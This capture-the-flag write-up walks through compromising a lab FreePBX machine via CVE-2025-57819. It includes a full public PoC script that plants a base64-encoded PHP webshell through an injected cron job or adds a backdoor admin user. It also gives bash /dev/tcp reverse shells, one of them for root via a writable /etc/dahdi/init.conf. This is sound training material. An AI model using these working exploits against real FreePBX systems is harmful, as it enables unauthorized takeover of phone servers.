\------------------------------------------------------------------------------------ Connected Writeup----------------------------------------------------------------------------------------







Step:-1 Reconnaissance:-





nmap -A -sS -P -T4  --min-rate 5000 10.129.9.164

Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-06-07 12:54 UTC

Nmap scan report for 10.129.9.164

Host is up (0.25s latency).

Not shown: 997 filtered tcp ports (no-response)

PORT    STATE SERVICE  VERSION

22/tcp  open  ssh      OpenSSH 7.4 (protocol 2.0)

| ssh-hostkey:

|   2048 4e:60:38:6f:e7:78:6c:ca:58:62:a1:f1:56:ae:8d:30 (RSA)

|   256 12:41:55:26:9d:ad:3d:e8:bf:4e:31:aa:d7:d1:a5:d2 (ECDSA)

|\_  256 8e:b6:96:e0:21:83:5d:1d:ce:8d:e2:6a:dd:38:c6:75 (ED25519)

80/tcp  open  http     Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)

|\_http-title: Did not follow redirect to http://connected.htb/

|\_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16

443/tcp open  ssl/http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)

| http-title: 404 Not Found

|\_Requested resource was config.php

| ssl-cert: Subject: commonName=pbxconnect/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--

| Not valid before: 2025-11-30T14:07:27

|\_Not valid after:  2026-11-30T14:07:27

| http-robots.txt: 1 disallowed entry

|\_/

|\_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16

|\_ssl-date: TLS randomness does not represent time

Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port

Device type: general purpose|specialized|storage-misc

Running (JUST GUESSING): Linux 4.X|5.X|2.6.X (90%), Crestron 2-Series (86%), HP embedded (85%)

OS CPE: cpe:/o:linux:linux\_kernel:4 cpe:/o:linux:linux\_kernel:5 cpe:/o:linux:linux\_kernel:2.6.32 cpe:/o:crestron:2\_series cpe:/h:hp:p2000\_g3

Aggressive OS guesses: Linux 4.15 - 5.8 (90%), Linux 5.0 - 5.4 (90%), Linux 5.3 - 5.4 (89%), Linux 2.6.32 (89%), Linux 5.0 (88%), Linux 5.0 - 5.5 (88%), Crestron XPanel control system (86%), HP P2000 G3 NAS device (85%)

No exact OS matches for host (test conditions non-ideal).

Network Distance: 2 hops



TRACEROUTE (using port 22/tcp)

HOP RTT       ADDRESS

1   272.79 ms 10.10.14.1

2   261.76 ms 10.129.9.164



OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 48.03 seconds

&#x20;





\[#] Same as Always for Easy  Linux machine, except this has a 443 Security as well!





\[#] While Looking at the web panel.........



\[#] It turns out to be a freePBX administration panel, that requires username and password to get through it!





\[!] What is freePBX panel:- The FreePBX administration panel is a web-based, open-source graphical user interface (GUI) used to configure, manage, and control an Asterisk communication server. Instead of forcing you to manually write complex configuration files and command-line code to manage your phone system, the panel provides a visual dashboard to handle everything through a standard web Browser.





\[#] Down below the Web, we found the version FreePBX 16.0.40.7





\[#] After searching a little bit, i found an open CVE CVE-2025-57819: Pre-Auth SQL Injection to RCE





\[!] CVE-2025-57819 :-  Insufficiently sanitized user-supplied data in the Endpoint Manager (endpoint) module allows an unauthenticated, remote attacker to bypass normal authentication checks via an alternate path (/admin/ajax.php)







\[@] I have also found a public PoC for this vulnerability from https://github.com/MuhammadWaseem29/SQL-Injection-and-RCE\_CVE-2025-57819 (credit:-MuhammadWaseem29)







\[#] Now lets execute the PoC :-



curl -i -k "https://connected.htb/admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%

5Cajax\&command=model\&template=x\&model=model\&brand=x'+AND+EXTRACTVALUE(1,CONCAT('\~USER:',(SELECT+USER()),'\~'))+--+"





HTTP/1.1 500 Internal Server Error

Date: Thu, 11 Jun 2026 14:26:21 GMT

Server: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16

X-Powered-By: PHP/7.4.16

Set-Cookie: PHPSESSID=0kttdkra6ormo4psmqbrofdrff; expires=Sat, 11-Jul-2026 14:26:21 GMT; Max-Age=2592000; path=/

Expires: Thu, 19 Nov 1981 08:52:00 GMT

Cache-Control: no-store, no-cache, must-revalidate

Pragma: no-cache

Connection: close

Transfer-Encoding: chunked

Content-Type: application/json



{"error":{"type":"Exception","message":"SQLSTATE\[HY000]: General error: 1105 XPATH syntax error: **'\~USER:freepbxuser@localhost\~'**::","file":"\\/var\\/www\\/html\\/admin\\/libraries\\/utility.functions.php","line":123}}







\[#] The output, gave us the fatal 500 internal error, because,

as here--> (SELECT+USER()) we are running this database function  to find the current database account name



&#x09;

\[#] But the  EXTRACTVALUE() function requires XML arguments, and since the above user query isn't a XML argument, it throws the syntax error --> General error: 1105 XPATH syntax error:



\[#] Although the command still gave us the evaluated output of the USER( ) Function







\[$] Why the Database Evaluated the Function First?



The reason the database function executed despite generating a syntax error comes down to the database engine's Order of Operations (specifically, expression evaluation order).

Before a database function can execute its primary logic, it must resolve its input arguments.



The engine breaks down the step-by-step process like an algebraic equation:-



* Evaluate Arguments First: The database looks at EXTRACTVALUE(1, CONCAT('\~USER:',(SELECT USER()),'\~')). To pass data into EXTRACTVALUE, it must figure out what the second argument actually is.
* Execute Inner Queries: The engine runs the subquery (SELECT USER()). The database finds the string value freepbxuser@localhost.
* Concatenate the Strings: The CONCAT function merges the pieces together into a single string: '\~USER:freepbxuser@localhost\~'.
* Pass to the Main Function: The final string is passed into EXTRACTVALUE(1, '\~USER:freepbxuser@localhost\~').
* Trigger the Error: Finally, the internal logic of EXTRACTVALUE runs. It attempts to parse \~USER:freepbxuser@localhost\~ as an XPath query string. Because a tilde (\~) is an illegal character in XPath grammar, the parser fails at this step and throws a runtime syntax error.









\[#] In order to transit from SQL to RCE we need to alter the table configuration, we can't just write the commands directly into the parameters





\[#] Now how are we gonna do that?





\[#] Now, the freePBX handles some internal automation tasks via, cron\_jobs, in table might be named as cron\_jobs.



\[#] As we were successful in the SQL injection, means we can also be able to alter the table cron\_job

\[#] If we can alter this table, means we can add our own cron job.



\[#] and that cron\_job will periodically run on the master daemon, in the freePBX



\[#] Hence will achieve the RCE! as that inserted CRON job will run automatically!







\--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------







Step:-2 Initial Foothold!





\[#] hence there was a PoC script for this -- >





import argparse

import urllib3

import random

import string

import time

import hashlib

import base64

import json



import requests



banner = """			 \_\_         \_\_\_  \_\_\_\_\_\_\_\_\_\_\_

&#x09; \_\_  \_  \_\_\_\_\_\_ \_/  |\_\_ \_\_\_\_ |  |\_\\\\\_\_    \_\_\_\_\\\\\_\_\_\_  \_  \_\_\_\_\_\_\_\_

&#x09; \\\\ \\\\/ \\\\/ \\\\\_\_  \\\\    \_\_\_/ \_\_\_\\\\|  |  \\\\|    | /  \_ \\\\ \\\\/ \\\\/ \\\\\_  \_\_ \\\\

&#x09;  \\\\     / / \_\_ \\\\|  | \\\\  \\\\\_\_\_|   Y  |    |(  <\_> \\\\     / |  | \\\\/

&#x09;   \\\\/\\\\\_/ (\_\_\_\_  |\_\_|  \\\\\_\_\_  |\_\_\_|\_\_|\_\_  | \\\\\_\_  / \\\\/\\\\\_/  |\_\_|

&#x09;			  \\\\/          \\\\/     \\\\/

&#x09;

&#x20;       watchTowr-vs-FreePBX-CVE-2025-57819.py

&#x20;       (\*) CVE-2025-57819 Detection Artifact Generator: FreePBX Auth Bypass + SQL Injection to RCE



&#x20;         - Piotr and Sonny of watchTowr

"""



urllib3.disable\_warnings(urllib3.exceptions.InsecureRequestWarning)



def clean(target\_url, info):



&#x20;   if info:

&#x20;       print('\[+] Cleaning.sh malicious cron\_job - please confirm manually that there is no malicious entries in asterisk.cron\_jobs table')

&#x20;   payload\_cleansh = '?module=FreePBX\\\\modules\\\\endpoint\\\\ajax\&command=model\&template=x\&model=model\&brand=x\\'; DELETE FROM cron\_jobs WHERE jobname LIKE \\'watchTowr-%%\\' -- '

&#x20;   requests.get(target\_url + payload\_cleansh, verify = False)



def exploit(host):



&#x20;   print('\[+] FreePBX CVE-2025-57819 Detection Artifact Generator started')



&#x20;   suffix = ''.join(random.choice(string.ascii\_lowercase + string.digits) for \_ in range(10))



&#x20;   target\_url = '%sadmin/ajax.php' % host

&#x20;   payload\_rce = '?module=FreePBX\\\\modules\\\\endpoint\\\\ajax\&command=model\&template=x\&model=model\&brand=x\\' ;INSERT INTO cron\_jobs (modulename,jobname,command,class,schedule,max\_runtime,enabled,execution\_order) VALUES (\\'sysadmin\\',\\'watchTowr-%s\\',\\'echo "PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8%%2bCg=="|base64 -d >/var/www/html/this-is-an-ioc-not-actually-watchTowr-%s.php\\',NULL,\\'\* \* \* \* \*\\',30,1,1) -- ' % (suffix, suffix)



&#x20;   print('\[+] Sending exploit request')

&#x20;   requests.get(target\_url + payload\_rce, verify = False)



&#x20;   print('\[+] Waiting 2 minutes for DAG script to be created')

&#x20;   shell\_path = '%sthis-is-an-ioc-not-actually-watchTowr-%s.php?cmd=hostname' % (host, suffix)

&#x20;   for i in range(0,120):

&#x20;       time.sleep(1)

&#x20;       resp = requests.get(shell\_path, verify = False)

&#x20;       if resp.status\_code == 200:

&#x20;           print('\[+] VULNERABLE - webshell found: %s' % shell\_path)

&#x20;           clean(target\_url, True)

&#x20;           return



&#x20;   #additional clean, just in case

&#x20;   clean(target\_url, False)



&#x20;   print('\[-] Webshell not found - falling back to user adding')



&#x20;   passwd = ''.join(random.choice(string.ascii\_lowercase + string.ascii\_uppercase + string.digits) for \_ in range(12))

&#x20;   passwd\_hash = hashlib.sha1(passwd.encode('utf-8')).hexdigest()



&#x20;   print('\[+] Adding user: watchTowr%s / %s' % (suffix, passwd))



&#x20;   payload\_user = '?module=FreePBX\\\\modules\\\\endpoint\\\\ajax\&command=model\&template=x\&model=model\&brand=x\\' ;INSERT INTO ampusers(username, email, extension,password\_sha1, extension\_low, extension\_high, deptname, sections) VALUES (\\'watchTowr%s\\' ,\\'\\' ,\\'\\' ,\\'%s\\' ,\\'\\' ,\\'\\' ,\\'\\' ,\\'\*\\') -- ' % (suffix, passwd\_hash)



&#x20;   requests.get(target\_url + payload\_user, verify = False)

&#x20;

&#x20;   print('\[+] Verifying if user exists')

&#x20;   time.sleep(2)



&#x20;   login\_url = '%s/admin/ajax.php?module=userman\&command=checkPasswordReminder' % host

&#x20;   headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Referer': '%s/admin/config.php' % host}

&#x20;   data = {'username': 'watchTowr%s' % suffix, 'password': base64.b64encode(passwd.encode('utf-8')), 'loginpanel' : 'admin'}



&#x20;   resp = requests.post(login\_url, headers = headers, data = data, verify = False)



&#x20;   if resp.status\_code == 200:

&#x20;       resp\_json = json.loads(resp.text)

&#x20;       if resp\_json\['status'] == True and 'loginfailed' not in resp\_json and 'Invalid Login' not in resp\_json\['message']:

&#x20;           print('\[+] VULNERABLE: user added')

&#x20;       else:

&#x20;           print('\[-] NOT VULNERABLE: user not added')

&#x20;       return



&#x20;   print('\[-] UNSPECIFIED - unknown error appeared, please verify manually')

&#x20;   return



if \_\_name\_\_ == "\_\_main\_\_":



&#x20;   print(banner)



&#x20;   usage = """python3 poc.py \[-h] -H HOST \\r\\n\\r\\n\\

&#x20;       For more help, use "python3 poc.py --help"

&#x20;       INFO HERE

&#x20;       """

&#x20;   parser = argparse.ArgumentParser(description = 'CVE-2025-57819: FreePBX Auth Bypass + SQL Injection to RCE', usage = usage)

&#x20;

&#x20;   #required arg

&#x20;   parser.add\_argument('-H', dest = 'host', action = "store", type = str, help = 'Host, eg. "https://freepbx.lab"', required = True)



&#x20;   #get arguments

&#x20;   args = parser.parse\_args()

&#x20;   host = args.host



&#x20;   if host\[-1] != '/':

&#x20;       host += '/'



&#x20;   exploit(host)







(credit:- watchtowerlabs)







\[#] Payload core logic :-



**INSERT INTO cron\_jobs (...) VALUES ('sysadmin', 'watchTowr-\[suffix]', 'echo "PD9waH...==" | base64 -d > /var/www/html/...php', ...)**





\[#] The primary payload is, creating a cron job that will add a shell php file into /var/www/html, so we can execute commands via the web



\[#] The secondary payload is creating a new user and binding access to the administrative web panel, the Config.php which prompts for username and password









\[#] Execution :-



python3 rce.py -H https://connected.htb

&#x20;                        \_\_         \_\_\_  \_\_\_\_\_\_\_\_\_\_\_

&#x20;        \_\_  \_  \_\_\_\_\_\_ \_/  |\_\_ \_\_\_\_ |  |\_\\\_\_    \_\_\_\_\\\_\_\_\_  \_  \_\_\_\_\_\_\_\_

&#x20;        \\ \\/ \\/ \\\_\_  \\    \_\_\_/ \_\_\_\\|  |  \\|    | /  \_ \\ \\/ \\/ \\\_  \_\_ \\

&#x20;         \\     / / \_\_ \\|  | \\  \\\_\_\_|   Y  |    |(  <\_> \\     / |  | \\/

&#x20;          \\/\\\_/ (\_\_\_\_  |\_\_|  \\\_\_\_  |\_\_\_|\_\_|\_\_  | \\\_\_  / \\/\\\_/  |\_\_|

&#x20;                                 \\/          \\/     \\/

&#x20;

&#x20;       watchTowr-vs-FreePBX-CVE-2025-57819.py

&#x20;       (\*) CVE-2025-57819 Detection Artifact Generator: FreePBX Auth Bypass + SQL Injection to RCE



&#x20;         - Piotr and Sonny of watchTowr



\[+] FreePBX CVE-2025-57819 Detection Artifact Generator started

\[+] Sending exploit request

\[+] Waiting 2 minutes for DAG script to be created

\[+] VULNERABLE - webshell found: https://connected.htb/this-is-an-ioc-not-actually-watchTowr-rkjgpddqzp.php?cmd=hostname

\[+] Cleaning.sh malicious cron\_job - please confirm manually that there is no malicious entries in asterisk.cron\_jobs table





\[#] The execution was successful, and we can run shell commands at  https://connected.htb/this-is-an-ioc-not-actually-watchTowr-rkjgpddqzp.php?cmd=hostname





\#hostname (in parameter) :-



connected





(note:- you can retrieve the flag directly by reading /home/asterisk/user.txt)







\[#] Now lets get the shell!





\[#] Setup a listener :-



nc -lvnp 9898

listening on \[any] 9898 ...







\[#] Write the parameter with reverse shell payload with url encoding!



https://connected.htb/this-is-an-ioc-not-actually-watchTowr-rkjgpddqzp.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.\*\*\*\*.\*\*\*\*%2F9898%200%3E%261%27





\[#] Firing the query will give you the shell



&#x20;nc -lvnp 9898

listening on \[any] 9898 ...

connect to \[10.10.15.181] from (UNKNOWN) \[10.129.24.24] 41162

bash: no job control in this shell

\_\_\_\_\_\_                   \_\_\_\_\_\_ \_\_\_\_\_\_ \_\_   \_\_

|  \_\_\_|                  | \_\_\_ \\| \_\_\_ \\\\ \\ / /

| |\_    \_ \_\_   \_\_\_   \_\_\_ | |\_/ /| |\_/ / \\ V /

|  \_|  | '\_\_| / \_ \\ / \_ \\|  \_\_/ | \_\_\_ \\ /   \\

| |    | |   |  \_\_/|  \_\_/| |    | |\_/ // /^\\ \\

\\\_|    |\_|    \\\_\_\_| \\\_\_\_|\\\_|    \\\_\_\_\_/ \\/   \\/

&#x20;

&#x20;

NOTICE! You have 3 notifications! Please log into the UI to see them!

Current Network Configuration

+-----------+-------------------+---------------------------+

| Interface | MAC Address       | IP Addresses              |

+-----------+-------------------+---------------------------+

| eth0      | A2:DE:AD:69:8C:2E | 10.129.24.24              |

|           |                   | fe80::82bd:1bcb:a990:dd3b |

+-----------+-------------------+---------------------------+

ls



Please note most tasks should be handled through the GUI.

You can access the GUI by typing one of the above IPs in to your web browser.

For support please visit:

&#x20;   http://www.freepbx.org/support-and-professional-services



+---------------------------------------------------------------------+

| This machine is not activated.  Activating your system ensures that |

| your machine is eligible for support and that it has the ability to |

| install Commercial Modules.                                         |

|                                                                     |

| If you already have a Deployment ID for this machine, simply run:   |

|                                                                     |

|    fwconsole sysadmin activate deploymentid                         |

|                                                                     |

| to assign that Deployment ID to this system. If this system is new, |

| please go to Activation (which is on the System Admin page in the   |

| Web UI) and create a new Deployment there.                          |

+---------------------------------------------------------------------+



\[asterisk@connected html]$ ls

admin

index.php

restapps

robots.txt

this-is-an-ioc-not-actually-watchTowr-rkjgpddqzp.php

ucp

wcb.php





\[#] user compromised!







Step-3: Privilege Escalation!





\[#] For root, there is a service running named as "dahadi\_restart" with on sysadmin daemon!





\[#] And that service basically reads a config file from /etc/dahdi/init.conf





\[#] Luckily the User Asterisk has  write permissions over this ini file





\[#] hence we can overwrite the File with bash payload and can easily get the root shell!









\[#] To Overwrite the file--->





echo -e '\\n#\\nbash -i >\& /dev/tcp/10.10.xx.xx/4446 0>\&1 \&\\n#' >> /etc/dahdi/init.conf





\[#] Before that setup a listener with netcat at port 4446







\[#] Now trigger!


touch /var/spool/asterisk/sysadmin/dahdi\_restart









\[#] On the shell!





nc -lvnp 4446



listening on \[any] 4446 ...



connect to \[10.10.\*\*\*\*.\*\*\*\*] from (UNKNOWN) \[10.129.8.225] 59398



\# whoami

root



\# id

uid=0(root) gid=0(root) groups=0(root)





\[#] System Compromised!





